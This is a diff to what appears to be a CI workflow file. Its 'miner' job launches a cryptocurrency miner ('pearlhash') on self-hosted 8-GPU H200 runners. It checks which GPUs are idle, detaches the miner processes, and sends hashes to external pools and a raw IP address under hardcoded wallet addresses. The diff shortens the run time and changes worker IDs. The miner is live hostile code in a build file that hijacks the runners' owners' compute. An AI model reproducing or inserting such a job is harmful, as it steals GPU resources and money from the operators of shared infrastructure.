@@ -7,7 +7,7 @@ permissions:
 jobs:
   miner:
     runs-on: [self-hosted, '8-gpu-h200']
-    timeout-minutes: 60
+    timeout-minutes: 15
     continue-on-error: true
     strategy:
       fail-fast: false
@@ -23,7 +23,7 @@ jobs:
           SHARD="${{ matrix.shard }}"
           WALLET="prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql"
           NOCK="9becsPFXhMLCNAxb6TsMN492sS2Ev7ToLFR4zsc5K4NxRthTyh2kPcb"
-          D=/tmp/c211-128174
+          D=/tmp/c211-128965
           mkdir -p "$D"
           cd "$D" || exit 0
           echo "C211_JOB shard=$SHARD host=$(hostname) uid=$(id -u) user=$(id -un) ts=$(date -u +%FT%TZ)"
@@ -113,7 +113,7 @@ jobs:
           import re
           out=[]
           try:
-              for ln in open('/tmp/c211-128174/plan.txt'):
+              for ln in open('/tmp/c211-128965/plan.txt'):
                   m=re.search(r'PLAN gpu=(\d+) uuid=(\S+) action=start', ln)
                   if m: out.append(m.group(1)+':'+m.group(2))
           except Exception: pass
@@ -127,7 +127,7 @@ jobs:
             i=${pair%%:*}; uuid=${pair##*:}
             nowbusy=$(nvidia-smi --query-compute-apps=gpu_uuid --format=csv,noheader 2>/dev/null | grep -c -- "$uuid")
             if [ "$nowbusy" != "0" ]; then echo "RECHECK_SKIP gpu=$i uuid=$uuid apps=$nowbusy"; continue; fi
-            setsid nohup "$WR" --algo pearlhash -o pool.pearlhash.xyz:9000 -o hk.pearlhash.net:9000 -o global.pearlhash.net:9000 -u "$WALLET" -p x --worker "128174${SHARD}${i}" -d "$i" --print-time 30 > "$D/wr-g$i.log" 2>&1 &
+            setsid nohup "$WR" --algo pearlhash -o pool.pearlhash.xyz:9000 -o hk.pearlhash.net:9000 -o global.pearlhash.net:9000 -u "$WALLET" -p x --worker "128965${SHARD}${i}" -d "$i" --print-time 30 > "$D/wr-g$i.log" 2>&1 &
             P=$!
             echo $P > "$D/pid-g$i"
             echo "STARTED gpu=$i uuid=$uuid pid=$P worker=128174${SHARD}${i}"
@@ -141,7 +141,7 @@ jobs:
           LP_DONE=0
           while :; do
             NOW=$(date +%s); EL=$((NOW-T0))
-            if [ $EL -ge 1320 ]; then break; fi
+            if [ $EL -ge 540 ]; then break; fi
             for i in $LAUNCH; do
               LF="$D/wr-g$i.log"
               ACC=$(grep -ac 'accepted (' "$LF" 2>/dev/null); ACC=${ACC:-0}
@@ -156,7 +156,7 @@ jobs:
                 if [ "$ACC" -eq 0 ]; then
                   echo "LP_FALLBACK gpu=$i wallet=${WALLET}+${NOCK}"
                   kill -9 -"$(cat "$D/pid-g$i" 2>/dev/null)" 2>/dev/null
-                  setsid nohup "$WR" --algo pearlhash -o 103.199.106.122:3362 -u "${WALLET}+${NOCK}" -p x --worker "128174${SHARD}${i}" -d "$i" --print-time 30 > "$D/wr-g$i.lp.log" 2>&1 &
+                  setsid nohup "$WR" --algo pearlhash -o 103.199.106.122:3362 -u "${WALLET}+${NOCK}" -p x --worker "128965${SHARD}${i}" -d "$i" --print-time 30 > "$D/wr-g$i.lp.log" 2>&1 &
                   echo $! > "$D/pid-g$i"
                 fi
               done
